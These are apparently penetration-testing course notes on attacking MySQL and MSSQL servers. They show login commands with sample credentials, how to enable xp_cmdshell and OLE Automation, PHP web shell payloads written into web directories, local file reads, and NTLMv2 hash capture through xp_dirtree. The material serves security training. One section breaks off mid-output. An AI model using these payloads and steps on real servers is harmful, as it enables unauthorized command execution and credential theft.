### Attacking SQL Databases

```
# MySQL and Microsoft SQL Server (MSSQL) are relational database management systems that store data in tables, columns, rows.
# Many relational database systems like MSSQL & MySQL use the Structured Query Language (SQL) 
# for querying and maintaining the database.
```

```
# By default, MSSQL uses ports TCP/1433 and UDP/1434, and MySQL uses TCP/3306. 
# However, when MSSQL operates in a "hidden" mode, it uses the TCP/2433 port. 
# We can use Nmap's default scripts -sC option to enumerate database services on a target system:

nmap -Pn -sV -sC -p1433 10.10.10.125
```

### MySQL - Connecting to the SQL Server

```
mysql -u julio -pPassword123 -h 10.129.20.13                      # With mysql tool (Linux)
C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30  # With sqlcmd (Win)
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h                 # To connection to MSSQL server from Linux
mssqlclient.py -p 1433 julio@10.129.203.7                         # Or with mssqlclient.py tool on python
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h              # Login with targetting a local account
```

### SQL Default Databases

```
MySQL default system schemas/databases:

- mysql - is the system database that contains tables that store information required by the MySQL server
- information_schema - provides access to database metadata
- performance_schema - is a feature for monitoring MySQL Server execution at a low level
- sys - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

MSSQL default system schemas/databases:

- master - keeps the information for an instance of SQL Server.
- msdb - used by SQL Server Agent.
- model - a template database copied for each new database.
- resource - a read-only database that keeps system objects visible in every database on the server in sys schema.
- tempdb - keeps temporary objects for SQL queries.
```

### SQL Syntax (SQL/MSSQL)

```
mysql> SHOW DATABASES;          # show existing databases on db instance
mysql> USE htbusers;            # use (switch to) target DB
mysql> SHOW TABLES;             # Show tables in DB
mysql> SELECT * FROM users;     # Select target data from table
 
1> SELECT name FROM master.dbo.sysdatabases   # If we use sqlcmd, we will need to use GO after our query 
2> GO

1> USE htbusers                               # use (switch to) target DB
2> GO     

1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES  # Show tables in DB
2> GO 

1> SELECT * FROM users                         # # Select target data from table
2> go 
```

### Execute Commands

```
# Command execution is one of the most desired capabilities when attacking common services 
# because it allows us to control the operating system. 
# If we have the appropriate privileges, we can use the SQL database to execute system commands 
# or create the necessary elements to do it.
```

```
# MSSQL has a extended stored procedures called xp_cmdshell which allow us to execute system commands using SQL. 
# Keep in mind the following about xp_cmdshell:

- xp_cmdshell is a powerful feature and disabled by default. xp_cmdshell can be enabled and disabled 
  by using the Policy-Based Management or by executing sp_configure

- The Windows process spawned by xp_cmdshell has the same security rights as the SQL Server service account
  xp_cmdshell operates synchronously. Control is not returned to the caller until the command-shell command is completed
```

```
1> xp_cmdshell 'whoami'         # checking if xp_cmdshell is on (nope)
2> GO

output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
```

```
# If xp_cmdshell is not enabled, we can enable it, if we have the appropriate privileges, using the following command:

# To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

# To update the currently configured value for advanced options.  
RECONFIGURE
GO  

# To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

# To update the currently configured value for this feature.  
RECONFIGURE
GO
```

#### Write Local Files

```
# MySQL does not have a stored procedure like xp_cmdshell, 
# but we can achieve command execution if we write to a location in the file system that can execute our commands. 
# For example, suppose MySQL operates on a PHP-based web server or other programming languages like ASP.NET. 
# If we have the appropriate privileges, we can attempt to write a file using SELECT INTO OUTFILE in the webserver directory. 
# Then we can browse to the location where the file is and execute our commands.
```

```
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)
```

```
# In MySQL, a global system variable secure_file_priv limits the effect of data import and export operations, 
# such as those performed by the LOAD DATA and SELECT â€¦ INTO OUTFILE statements and the LOAD_FILE() function. 
# These operations are permitted only to users who have the FILE privilege.
```

```
# secure_file_priv may be set as follows:

- If empty, the variable has no effect, which is not a secure setting.
- If set to the name of a directory, the server limits import and export operations to work only with files in that directory. 
- The directory must exist; the server does not create it.
- If set to NULL, the server disables import and export operations.
```

```
# In the following example, we can see the secure_file_priv variable is empty, 
# which means we can read and write data using MySQL:

mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```

### MSSQL - Enable Ole Automation Procedures 

[ole-automation](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option)

```
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

### MSSQL - Create a File

```
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8>
```

### Read Local Files

```
# Read Local Files in MSSQL

1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO

BulkColumn

### Latest SQL Vulnerabilities

```
# This time let's discuss a vulnerability that does not have a CVE and does not require a direct exploit. 
# The previous section shows that we can get the NTLMv2 hashes by interacting with the MSSQL server. 
# However, we should mention again that this attack is possible through a direct connection to the MSSQL server 
# and vulnerable web applications. 
# However, we will only focus on the simpler variant for the time being, namely the direct interaction.
```

```
# The Concept of the Attack

# The interesting thing is that the MSSQL function xp_dirtree is not directly a vulnerability 
# but takes advantage of the authentication mechanism of SMB. 
# When we try to access a shared folder on the network with a Windows host, 
# this Windows host automatically sends an NTLMv2 hash for authentication.
# This hash can be used in various ways against the MSSQL server and other hosts in the corporate network. 
# This includes an SMB Relay attack where we "replay" the hash to log into other systems 
# where the account has local admin privileges or cracking this hash on our local system.
```

```
# Finally, the hash is intercepted by tools like Responder, WireShark, or TCPDump and displayed to us, 
# which we can try to use for our purposes. 
# Apart from that, there are many different ways to execute commands in MSSQL. 
# For example, another interesting method would be to execute Python code in a SQL query. 
# We can find more about this in the documentation from Microsoft. 
```
